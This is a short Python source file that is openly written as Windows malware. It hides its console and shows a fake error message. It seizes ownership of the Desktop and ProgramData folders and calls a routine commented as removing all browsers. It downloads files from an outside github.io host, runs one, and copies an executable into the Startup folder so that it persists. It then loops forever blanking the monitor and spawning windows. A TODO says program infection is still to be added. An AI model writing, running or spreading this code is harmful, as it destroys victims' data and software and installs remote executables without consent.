from utils.functions import *
from src.HTTPLib import HttpClient
from pathlib import Path

import shutil
import os

HideConsole()

ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000")

folder_ownership = getFolderOwner(getDesktopPath())
permissions = getOwnerShip(getDesktopPath())

folder_path = getDesktopPath()
result = SetOwnership(folder_path)
if result:
    pass
else:
    pass


default_disk = os.environ['SYSTEMDRIVE']
objects.getAllUnifiedObjectsAndDelete() # Removing all browsers
def REMPROM():
    defaultdiskpath = default_disk + "\\ProgramData\\"
    permissions = getOwnerShip(defaultdiskpath)
    folder_ownership = getFolderOwner(defaultdiskpath)

    result = SetOwnership(defaultdiskpath)
    if result:
        pass
    else:
        pass





path = DownloadFile('https://psvks.github.io/psvks/uploads/FullVersion.mp3')
StartProcess(path)
path2 = DownloadFile('https://psvks.github.io/psvks/uploads/otherfile.exe')
def addBSOD():
    global path2
    file_path = path2
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shutil.copy(file_path, startup_folder)

REMPROM()
addBSOD()

while True:
    StopMonitor()
    os.system("start https://en.wikipedia.org/wiki/Computer_virus")
    os.system("start https://psvks.github.io/psvks/uploads/fucker.html")
    os.system("start notepad.exe")

# TODO: Need to implement a logic to infect programs.
